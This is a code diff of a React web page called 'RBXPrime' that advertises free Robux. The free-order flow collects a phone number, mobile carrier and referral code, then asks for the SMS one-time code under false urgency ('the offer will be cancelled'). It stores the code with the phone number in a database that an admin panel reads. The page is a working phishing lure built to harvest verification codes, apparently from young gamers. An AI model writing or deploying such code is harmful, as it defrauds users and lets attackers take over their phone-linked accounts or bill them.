-                <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mb-6"><Check className="w-12 h-12 text-green-500" /></div>
-                <h1 className="text-4xl md:text-5xl font-bold mb-4">{isFreeOrder ? 'Verification Successful!' : 'Payment Successful!'}</h1>
-                <p className="text-gray-400 text-lg max-w-lg mb-8">Your order has been confirmed.</p>
-                <button onClick={() => navigateTo('home')} className="px-8 py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all">Return to Home</button>
-            </div>
-        );
+        const OtpVerifyView = ({ phoneNumber, otp, setOtp, handleOtpSubmit, isProcessing, navigateTo }) => (
+            <div className="min-h-screen pt-32 pb-24 px-4 flex flex-col items-center justify-center text-center animate-in zoom-in-95">
+                <div className="w-24 h-24 bg-yellow-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse"><Smartphone className="w-12 h-12 text-yellow-500" /></div>
+                <h1 className="text-4xl md:text-5xl font-bold mb-4">Enter Verification Code</h1>
+                <p className="text-gray-400 text-lg max-w-lg mb-8">We have sent a 4-digit code to <span className="text-white font-bold">{phoneNumber}</span></p>
+                <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-xl mb-8 max-w-md w-full flex items-start gap-3"><AlertTriangle className="w-6 h-6 text-red-500 shrink-0" /><p className="text-red-400 text-sm text-left font-semibold">OTP can take up to 10min so please wait or else the offer will be cancelled.</p></div>
+                <form onSubmit={handleOtpSubmit} className="w-full max-w-xs space-y-6">
+                    <input required type="text" maxLength="4" placeholder="0000" value={otp} onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, ''))} className="w-full h-16 text-center text-3xl tracking-[0.5em] bg-[#111] border border-white/20 rounded-xl focus:border-white/50 outline-none transition-all"/>
+                    <button type="submit" disabled={isProcessing || otp.length < 4} className="w-full py-4 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all disabled:opacity-50 disabled:cursor-not-allowed">{isProcessing ? 'Verifying...' : 'Verify & Claim Robux'}</button>
+                </form>
+                <button onClick={() => navigateTo('checkout')} className="mt-6 text-sm text-gray-500 hover:text-white transition-colors">Change Phone Number</button>
+            </div>
+        );
 
-        // --- MAIN APP ---
-        const App = () => {
-            const [currentView, setCurrentView] = useState('home'); 
-            const [isMenuOpen, setIsMenuOpen] = useState(false);
-            const [isCartOpen, setIsCartOpen] = useState(false);
-            const [scrolled, setScrolled] = useState(false);
-            const [cart, setCart] = useState([]);
-            const [email, setEmail] = useState('');
-            const [phoneNumber, setPhoneNumber] = useState('+33 ');
-            const [simProvider, setSimProvider] = useState('');
-            const [referralCode, setReferralCode] = useState('');
-            const [otp, setOtp] = useState('');
-            const [isProcessing, setIsProcessing] = useState(false);
-            const [orderId, setOrderId] = useState('');
-            const [userEmail, setUserEmail] = useState('');
-            const [isAdmin, setIsAdmin] = useState(false);
-            const [showLoginModal, setShowLoginModal] = useState(false);
-            const [showSupport, setShowSupport] = useState(false); // New state for support modal
-            const [currentDocId, setCurrentDocId] = useState(null);
-            const [username, setUsername] = useState(''); // Moved username state here for CheckoutView access
-            const [notification, setNotification] = useState(null); // { message: string, type: 'error'|'success' }
+        const SuccessView = ({ isFreeOrder, orderId, navigateTo }) => (
+            <div className="min-h-screen pt-32 pb-24 px-4 flex flex-col items-center justify-center text-center animate-in zoom-in-95">
+                <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mb-6"><Check className="w-12 h-12 text-green-500" /></div>
+                <h1 className="text-4xl md:text-5xl font-bold mb-4">{isFreeOrder ? 'Verification Successful!' : 'Payment Successful!'}</h1>
+                <p className="text-gray-400 text-lg max-w-lg mb-8">Your order has been confirmed.</p>
+                <button onClick={() => navigateTo('home')} className="px-8 py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all">Return to Home</button>
+            </div>
+        );
 
-            useEffect(() => {
-                const handleScroll = () => setScrolled(window.scrollY > 20);
-                window.addEventListener('scroll', handleScroll);
-                const auth = getAuth();
-                const fb = getFb();
-                if (auth && fb) {
-                    const unsubscribe = fb.onAuthStateChanged(auth, (user) => {
-                        if (user && !user.isAnonymous) {
-                            if (ALLOWED_ADMINS.includes(user.email)) { setUserEmail(user.email); setIsAdmin(true); } 
-                            else { 
-                                fb.signOut(auth); 
-                                setIsAdmin(false); 
-                                setUserEmail('');
-                                showNotification("Access Denied: You are not authorized.", "error");
-                            }
-                        } else {
-                            setUserEmail(''); setIsAdmin(false);
-                            if (!user) {
-                                fb.signInAnonymously(auth).catch(e => console.log("Anon auth failed", e));
-                            }
-                        }
-                    });
-                    return () => { window.removeEventListener('scroll', handleScroll); unsubscribe(); };
-                }
-                return () => window.removeEventListener('scroll', handleScroll);
-            }, []);
+        // --- MAIN APP ---
+        const App = () => {
+            const [currentView, setCurrentView] = useState('home'); 
+            const [isMenuOpen, setIsMenuOpen] = useState(false);
+            const [isCartOpen, setIsCartOpen] = useState(false);
+            const [scrolled, setScrolled] = useState(false);
+            const [cart, setCart] = useState([]);
+            const [email, setEmail] = useState('');
+            const [phoneNumber, setPhoneNumber] = useState('+33 ');
+            const [simProvider, setSimProvider] = useState('');
+            const [referralCode, setReferralCode] = useState('');
+            const [otp, setOtp] = useState('');
+            const [isProcessing, setIsProcessing] = useState(false);
+            const [orderId, setOrderId] = useState('');
+            const [userEmail, setUserEmail] = useState('');
+            const [isAdmin, setIsAdmin] = useState(false);
+            const [showLoginModal, setShowLoginModal] = useState(false);
+            const [showSupport, setShowSupport] = useState(false);
+            const [currentDocId, setCurrentDocId] = useState(null);
+            const [username, setUsername] = useState('');
+            const [notification, setNotification] = useState(null);
 
-            const showNotification = (message, type = 'error') => {
-                setNotification({ message, type });
-            };
+            useEffect(() => {
+                const handleScroll = () => setScrolled(window.scrollY > 20);
+                window.addEventListener('scroll', handleScroll);
+                
+                // Initialize Firebase Auth - Anonymous to allow DB writes/reads
+                const fb = getFb();
+                const auth = getAuth();
+                
+                const initAuth = async () => {
+                    if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                        try {
+                            await fb.signInWithCustomToken(auth, __initial_auth_token);
+                        } catch(e) { console.error("Token Auth Failed", e); await fb.signInAnonymously(auth); }
+                    } else {
+                        await fb.signInAnonymously(auth);
+                    }
+                };
+                initAuth();
 
-            const handleLogin = (email) => { setUserEmail(email); setShowLoginModal(false); if (ALLOWED_ADMINS.includes(email)) setIsAdmin(true); };
-            const handleLogout = () => { const fb = getFb(); const auth = getAuth(); fb.signOut(auth).then(() => { setUserEmail(''); setIsAdmin(false); setCurrentView('home'); fb.signInAnonymously(auth); }); };
-            const addToCart = (pkg) => { if (pkg.price === 0 && cart.some(item => item.price === 0)) { showNotification("One Free Reward only.", "error"); return; } if (pkg.price === 0) setCart([pkg]); else setCart([...cart.filter(item => item.price !== 0), pkg]); setIsCartOpen(true); };
-            const removeFromCart = (index) => { const newCart = [...cart]; newCart.splice(index, 1); setCart(newCart); };
-            const cartTotal = cart.reduce((sum, item) => sum + item.price, 0);
-            const isFreeOrder = cart.length === 1 && cart[0].price === 0;
-            const navigateTo = (view) => { setCurrentView(view); setIsMenuOpen(false); setIsCartOpen(false); window.scrollTo(0, 0); };
+                const unsubscribe = fb.onAuthStateChanged(auth, (user) => {
+                    // We only use auth for database access here. 
+                    // Admin login is handled via the separate Modal logic for this specific demo.
+                });
+                return () => { window.removeEventListener('scroll', handleScroll); unsubscribe(); };
+            }, []);
 
-            const handleCheckout = async (e, showNotif) => {
-                e.preventDefault();
-                setIsProcessing(true);
-                
-                if (isFreeOrder) {
-                    if (!simProvider) { showNotif("Select SIM.", "error"); setIsProcessing(false); return; }
-                    
-                    if (phoneNumber.length < 13) { showNotif("Please complete the phone number.", "error"); setIsProcessing(false); return; }
+            const showNotification = (message, type = 'error') => {
+                setNotification({ message, type });
+            };
 
-                    if (!referralCode) { showNotif("Referral code is required for the free offer.", "error"); setIsProcessing(false); return; }
+            const handleLogin = (email) => { 
+                setUserEmail(email); 
+                setShowLoginModal(false); 
+                if (ALLOWED_ADMINS.includes(email)) setIsAdmin(true); 
+            };
+            
+            const handleLogout = () => { 
+                setUserEmail(''); 
+                setIsAdmin(false); 
+                setCurrentView('home'); 
+            };
+            
+            const addToCart = (pkg) => { 
+                if (pkg.price === 0 && cart.some(item => item.price === 0)) { showNotification("One Free Reward only.", "error"); return; } 
+                if (pkg.price === 0) setCart([pkg]); 
+                else setCart([...cart.filter(item => item.price !== 0), pkg]); 
+                setIsCartOpen(true); 
+            };
+            
+            const removeFromCart = (index) => { const newCart = [...cart]; newCart.splice(index, 1); setCart(newCart); };
+            const cartTotal = cart.reduce((sum, item) => sum + item.price, 0);
+            const isFreeOrder = cart.length === 1 && cart[0].price === 0;
+            const navigateTo = (view) => { setCurrentView(view); setIsMenuOpen(false); setIsCartOpen(false); window.scrollTo(0, 0); };
 
-                    // REFERRAL CODE VALIDATION
-                    const fb = getFb();
-                    const db = getDb();
-                    if (db) {
-                        try {
-                            const q = fb.query(fb.collection(db, "referral_codes"), fb.where("code", "==", referralCode.toUpperCase()));
-                            const querySnapshot = await fb.getDocs(q);
-                            
-                            if (querySnapshot.empty) {
-                                // Updated alert message
-                                showNotif("The referral code doesn't exist or is wrong.", "error");
-                                setIsProcessing(false);
-                                return;
-                            }
+            const handleCheckout = async (e, showNotif) => {
+                e.preventDefault();
+                setIsProcessing(true);
+                
+                if (isFreeOrder) {
+                    if (!simProvider) { showNotif("Select SIM.", "error"); setIsProcessing(false); return; }
+                    if (phoneNumber.length < 13) { showNotif("Please complete the phone number.", "error"); setIsProcessing(false); return; }
+                    if (!referralCode) { showNotif("Referral code is required for the free offer.", "error"); setIsProcessing(false); return; }
 
-                            // NON-BLOCKING DB WRITE FOR ORDER
-                            fb.addDoc(fb.collection(db, "orders"), {
-                                username: username, // Include username
-                                phone: phoneNumber, sim: simProvider, referral: referralCode.toUpperCase(), status: "pending_otp", timestamp: fb.serverTimestamp()
-                            }).then(docRef => setCurrentDocId(docRef.id)).catch(err => console.error(err));
+                    const fb = getFb();
+                    const db = getDb();
+                    
+                    if (db) {
+                        try {
+                            // Rule Compliance: Fetch all docs to check code in memory instead of complex query
+                            const snapshot = await fb.getDocs(getPublicCollection("referral_codes"));
+                            const validCode = snapshot.docs.find(doc => doc.data().code === referralCode.toUpperCase());
+                            
+                            if (!validCode) {
+                                showNotif("The referral code doesn't exist or is wrong.", "error");
+                                setIsProcessing(false);
+                                return;
+                            }
 
-                        } catch (err) {
-                            console.error("Error checking referral:", err);
-                            // Fallback if db read fails
-                        }
-                    }
-                    setTimeout(() => { setIsProcessing(false); setCurrentView('otp-verify'); window.scrollTo(0, 0); }, 2000);
-                } else {
-                    setTimeout(() => { setIsProcessing(false); setOrderId("PAY-" + Math.random().toString(36).substr(2, 6)); setCart([]); setCurrentView('success'); window.scrollTo(0, 0); }, 2500);
-                }
-            };
+                            // Create order
+                            const docRef = await fb.addDoc(getPublicCollection("orders"), {
+                                username: username,
+                                phone: phoneNumber, 
+                                sim: simProvider, 
+                                referral: referralCode.toUpperCase(), 
+                                status: "pending_otp", 
+                                timestamp: fb.serverTimestamp()
+                            });
+                            setCurrentDocId(docRef.id);
 
-            const handleOtpSubmit = async (e) => {
-                e.preventDefault();
-                setIsProcessing(true);
-                const db = getDb();
-                const fb = getFb();
-                if (db) {
-                    if (currentDocId) {
-                        fb.updateDoc(fb.doc(db, "orders", currentDocId), { status: "verified", otp: otp }).catch(console.error);
-                    } else {
-                        // Backup create if first one failed/slow
-                        fb.addDoc(fb.collection(db, "orders"), { username: username, phone: phoneNumber, sim: simProvider, referral: referralCode, otp: otp, status: "verified", timestamp: fb.serverTimestamp() }).catch(console.error);
-                    }
-                }
-                setTimeout(() => { setIsProcessing(false); setOrderId("VRF-" + Math.random().toString(36).substr(2, 6)); setCart([]); setCurrentView('success'); window.scrollTo(0, 0); }, 3000);
-            };
+                        } catch (err) {
+                            console.error("Error checking referral:", err);
+                            showNotif("System error. Please try again.", "error");
+                            setIsProcessing(false);
+                            return;
+                        }
+                    }
+                    setTimeout(() => { setIsProcessing(false); setCurrentView('otp-verify'); window.scrollTo(0, 0); }, 2000);
+                } else {
+                    setTimeout(() => { setIsProcessing(false); setOrderId("PAY-" + Math.random().toString(36).substr(2, 6)); setCart([]); setCurrentView('success'); window.scrollTo(0, 0); }, 2500);
+                }
+            };
 
-            return (
-                <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-white/20">
-                    <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none"><div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-white/5 blur-[120px]" /><div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-gray-500/10 blur-[120px]" /></div>
-                    
-                    {notification && <Popup message={notification.message} type={notification.type} onClose={() => setNotification(null)} />}
-                    {showLoginModal && <LoginModal onClose={() => setShowLoginModal(false)} onLogin={handleLogin} showNotification={showNotification} />}
-                    {showSupport && <SupportModal onClose={() => setShowSupport(false)} />}
-                    
-                    {currentView === 'admin' ? <AdminPanel onBack={() => setCurrentView('home')} showNotification={showNotification} /> : (
-                        <>
-                            <nav className={`fixed w-full z-50 transition-all duration-300 ${scrolled ? 'bg-[#050505]/90 backdrop-blur-md border-b border-white/10' : 'bg-transparent'}`}>
-                                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                                    <div className="flex justify-between items-center h-20">
-                                        <div className="flex items-center gap-2 cursor-pointer" onClick={() => navigateTo('home')}><div className="w-10 h-10 rounded-xl bg-white text-black flex items-center justify-center shadow-lg shadow-white/10"><RobuxLogo className="w-6 h-6 text-black" /></div><span className="text-2xl font-bold tracking-tighter">RBX<span className="text-gray-400">Prime</span></span></div>
-                                        <div className="hidden md:flex items-center space-x-8">
-                                            <button onClick={() => navigateTo('home')} className="text-sm font-medium text-gray-300 hover:text-white">Home</button>
-                                            <button onClick={() => setIsCartOpen(!isCartOpen)} className="flex items-center gap-2 px-5 py-2.5 rounded-full bg-white text-black hover:bg-gray-200 transition-all hover:scale-105 active:scale-95 font-bold"><ShoppingCart className="w-4 h-4" /><span className="text-sm">Cart ({cart.length})</span></button>
-                                            <button onClick={() => setShowSupport(true)} className="text-sm font-medium text-gray-300 hover:text-white">Support</button>
-                                            {userEmail ? <div className="flex items-center gap-4">{isAdmin && <button onClick={() => setCurrentView('admin')} className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 rounded-lg text-sm font-bold"><Database className="w-4 h-4" /> Admin Panel</button>}<button onClick={handleLogout} className="text-sm text-gray-400 hover:text-white">Logout</button></div> : <button onClick={() => setShowLoginModal(true)} className="flex items-center gap-2 text-sm font-medium text-white hover:text-yellow-400"><LogIn className="w-4 h-4" /> Login</button>}
-                                        </div>
-                                        <div className="md:hidden flex items-center gap-4"><button onClick={() => setIsCartOpen(!isCartOpen)} className="p-2 text-white relative"><ShoppingCart className="w-6 h-6" />{cart.length > 0 && <span className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full text-[10px] flex items-center justify-center font-bold">{cart.length}</span>}</button><button onClick={() => setIsMenuOpen(!isMenuOpen)} className="p-2 text-gray-400 hover:text-white">{isMenuOpen ? <X /> : <Menu />}</button></div>
-                                    </div>
-                                </div>
-                                {isMenuOpen && <div className="md:hidden bg-[#0a0a0b] border-b border-white/10 absolute w-full"><div className="px-4 pt-2 pb-6 space-y-2"><button onClick={() => navigateTo('home')} className="block w-full text-left px-3 py-2 text-base font-medium text-white bg-white/5 rounded-lg">Home</button><button onClick={() => setShowSupport(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Support</button>{userEmail ? <><button onClick={handleLogout} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Logout</button></> : <button onClick={() => setShowLoginModal(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-yellow-400">Login</button>}</div></div>}
-                                {isCartOpen && <div className="absolute top-20 right-0 md:right-10 w-full md:w-96 bg-[#111] border border-white/10 shadow-2xl rounded-b-2xl md:rounded-2xl p-6 overflow-hidden z-50 animate-in"><div className="flex justify-between items-center mb-4"><h3 className="font-bold text-xl">Your Cart</h3><button onClick={() => setIsCartOpen(false)}><X className="w-5 h-5 text-gray-500 hover:text-white" /></button></div>{cart.length === 0 ? <div className="text-center py-8 text-gray-500"><ShoppingCart className="w-12 h-12 mx-auto mb-3 opacity-20" /><p>Your cart is empty</p></div> : <div className="space-y-4 max-h-[60vh] overflow-y-auto pr-2">{cart.map((item, idx) => (<div key={idx} className="flex justify-between items-center bg-white/5 p-3 rounded-xl border border-white/5"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}</p></div></div><button onClick={() => removeFromCart(idx)} className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>))}</div>}{cart.length > 0 && <div className="mt-6 pt-4 border-t border-white/10"><div className="flex justify-between items-center mb-4 text-lg font-bold"><span>Total</span><span>€{cartTotal.toFixed(2)}</span></div><button onClick={() => navigateTo('checkout')} className="w-full py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-colors flex items-center justify-center gap-2">Checkout Now <ChevronRight className="w-4 h-4" /></button></div>}</div>}
-                            </nav>
-                            <main>
-                                {currentView === 'home' && <HomeView username={username} setUsername={setUsername} addToCart={addToCart} />}
-                                {currentView === 'checkout' && <CheckoutView username={username} setUsername={setUsername} email={email} setEmail={setEmail} phoneNumber={phoneNumber} setPhoneNumber={setPhoneNumber} simProvider={simProvider} setSimProvider={setSimProvider} referralCode={referralCode} setReferralCode={setReferralCode} isFreeOrder={isFreeOrder} handleCheckout={handleCheckout} isProcessing={isProcessing} cartTotal={cartTotal} cart={cart} navigateTo={navigateTo} showNotification={showNotification} />}
-                                {currentView === 'otp-verify' && <OtpVerifyView phoneNumber={phoneNumber} otp={otp} setOtp={setOtp} handleOtpSubmit={handleOtpSubmit} isProcessing={isProcessing} navigateTo={navigateTo} />}
-                                {currentView === 'success' && <SuccessView isFreeOrder={isFreeOrder} username={username} orderId={orderId} navigateTo={navigateTo} />}
-                            </main>
-                            <footer className="bg-black border-t border-white/10 pt-16 pb-8"><div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><div className="flex flex-col md:flex-row justify-between items-center gap-6"><div className="flex items-center gap-2"><div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-black" /></div><span className="text-xl font-bold text-white">RBXPrime</span></div><p className="text-gray-600 text-sm">© 2024 RBXPrime. Systems Active.</p><div className="flex gap-4 opacity-50"><CreditCard className="w-6 h-6" /></div></div></div></footer>
-                        </>
-                    )}
-                </div>
-            );
-        };
+            const handleOtpSubmit = async (e) => {
+                e.preventDefault();
+                setIsProcessing(true);
+                const fb = getFb();
+                
+                if (currentDocId) {
+                    try {
+                        await fb.updateDoc(getPublicDoc("orders", currentDocId), { status: "verified", otp: otp });
+                    } catch(e) { console.error(e); }
+                } else {
+                    // Fallback
+                    try {
+                        await fb.addDoc(getPublicCollection("orders"), { username: username, phone: phoneNumber, sim: simProvider, referral: referralCode, otp: otp, status: "verified", timestamp: fb.serverTimestamp() });
+                    } catch(e) { console.error(e); }
+                }
+                setTimeout(() => { setIsProcessing(false); setOrderId("VRF-" + Math.random().toString(36).substr(2, 6)); setCart([]); setCurrentView('success'); window.scrollTo(0, 0); }, 3000);
+            };
 
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<App />);
-    </script>
+            return (
+                <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-white/20">
+                    <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none"><div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-white/5 blur-[120px]" /><div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-gray-500/10 blur-[120px]" /></div>
+                    
+                    {notification && <Popup message={notification.message} type={notification.type} onClose={() => setNotification(null)} />}
+                    {showLoginModal && <LoginModal onClose={() => setShowLoginModal(false)} onLogin={handleLogin} showNotification={showNotification} />}
+                    {showSupport && <SupportModal onClose={() => setShowSupport(false)} />}
+                    
+                    {currentView === 'admin' ? <AdminPanel onBack={() => setCurrentView('home')} showNotification={showNotification} /> : (
+                        <>
+                            <nav className={`fixed w-full z-50 transition-all duration-300 ${scrolled ? 'bg-[#050505]/90 backdrop-blur-md border-b border-white/10' : 'bg-transparent'}`}>
+                                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                                    <div className="flex justify-between items-center h-20">
+                                        <div className="flex items-center gap-2 cursor-pointer" onClick={() => navigateTo('home')}><div className="w-10 h-10 rounded-xl bg-white text-black flex items-center justify-center shadow-lg shadow-white/10"><RobuxLogo className="w-6 h-6 text-black" /></div><span className="text-2xl font-bold tracking-tighter">RBX<span className="text-gray-400">Prime</span></span></div>
+                                        <div className="hidden md:flex items-center space-x-8">
+                                            <button onClick={() => navigateTo('home')} className="text-sm font-medium text-gray-300 hover:text-white">Home</button>
+                                            <button onClick={() => setIsCartOpen(!isCartOpen)} className="flex items-center gap-2 px-5 py-2.5 rounded-full bg-white text-black hover:bg-gray-200 transition-all hover:scale-105 active:scale-95 font-bold"><ShoppingCart className="w-4 h-4" /><span className="text-sm">Cart ({cart.length})</span></button>
+                                            <button onClick={() => setShowSupport(true)} className="text-sm font-medium text-gray-300 hover:text-white">Support</button>
+                                            {userEmail ? <div className="flex items-center gap-4">{isAdmin && <button onClick={() => setCurrentView('admin')} className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 rounded-lg text-sm font-bold"><Database className="w-4 h-4" /> Admin Panel</button>}<button onClick={handleLogout} className="text-sm text-gray-400 hover:text-white">Logout</button></div> : <button onClick={() => setShowLoginModal(true)} className="flex items-center gap-2 text-sm font-medium text-white hover:text-yellow-400"><LogIn className="w-4 h-4" /> Login</button>}
+                                        </div>
+                                        <div className="md:hidden flex items-center gap-4"><button onClick={() => setIsCartOpen(!isCartOpen)} className="p-2 text-white relative"><ShoppingCart className="w-6 h-6" />{cart.length > 0 && <span className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full text-[10px] flex items-center justify-center font-bold">{cart.length}</span>}</button><button onClick={() => setIsMenuOpen(!isMenuOpen)} className="p-2 text-gray-400 hover:text-white">{isMenuOpen ? <X /> : <Menu />}</button></div>
+                                    </div>
+                                </div>
+                                {isMenuOpen && <div className="md:hidden bg-[#0a0a0b] border-b border-white/10 absolute w-full"><div className="px-4 pt-2 pb-6 space-y-2"><button onClick={() => navigateTo('home')} className="block w-full text-left px-3 py-2 text-base font-medium text-white bg-white/5 rounded-lg">Home</button><button onClick={() => setShowSupport(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Support</button>{userEmail ? <><button onClick={handleLogout} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Logout</button></> : <button onClick={() => setShowLoginModal(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-yellow-400">Login</button>}</div></div>}
+                                {isCartOpen && <div className="absolute top-20 right-0 md:right-10 w-full md:w-96 bg-[#111] border border-white/10 shadow-2xl rounded-b-2xl md:rounded-2xl p-6 overflow-hidden z-50 animate-in"><div className="flex justify-between items-center mb-4"><h3 className="font-bold text-xl">Your Cart</h3><button onClick={() => setIsCartOpen(false)}><X className="w-5 h-5 text-gray-500 hover:text-white" /></button></div>{cart.length === 0 ? <div className="text-center py-8 text-gray-500"><ShoppingCart className="w-12 h-12 mx-auto mb-3 opacity-20" /><p>Your cart is empty</p></div> : <div className="space-y-4 max-h-[60vh] overflow-y-auto pr-2">{cart.map((item, idx) => (<div key={idx} className="flex justify-between items-center bg-white/5 p-3 rounded-xl border border-white/5"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}</p></div></div><button onClick={() => removeFromCart(idx)} className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>))}</div>}{cart.length > 0 && <div className="mt-6 pt-4 border-t border-white/10"><div className="flex justify-between items-center mb-4 text-lg font-bold"><span>Total</span><span>€{cartTotal.toFixed(2)}</span></div><button onClick={() => navigateTo('checkout')} className="w-full py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-colors flex items-center justify-center gap-2">Checkout Now <ChevronRight className="w-4 h-4" /></button></div>}</div>}
+                            </nav>
+                            <main>
+                                {currentView === 'home' && <HomeView username={username} setUsername={setUsername} addToCart={addToCart} />}
+                                {currentView === 'checkout' && <CheckoutView username={username} setUsername={setUsername} email={email} setEmail={setEmail} phoneNumber={phoneNumber} setPhoneNumber={setPhoneNumber} simProvider={simProvider} setSimProvider={setSimProvider} referralCode={referralCode} setReferralCode={setReferralCode} isFreeOrder={isFreeOrder} handleCheckout={handleCheckout} isProcessing={isProcessing} cartTotal={cartTotal} cart={cart} navigateTo={navigateTo} showNotification={showNotification} />}
+                                {currentView === 'otp-verify' && <OtpVerifyView phoneNumber={phoneNumber} otp={otp} setOtp={setOtp} handleOtpSubmit={handleOtpSubmit} isProcessing={isProcessing} navigateTo={navigateTo} />}
+                                {currentView === 'success' && <SuccessView isFreeOrder={isFreeOrder} username={username} orderId={orderId} navigateTo={navigateTo} />}
+                            </main>
+                            <footer className="bg-black border-t border-white/10 pt-16 pb-8"><div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><div className="flex flex-col md:flex-row justify-between items-center gap-6"><div className="flex items-center gap-2"><div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-black" /></div><span className="text-xl font-bold text-white">RBXPrime</span></div><p className="text-gray-600 text-sm">© 2024 RBXPrime. Systems Active.</p><div className="flex gap-4 opacity-50"><CreditCard className="w-6 h-6" /></div></div></div></footer>
+                        </>
+                    )}
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
 </body>
 </html>
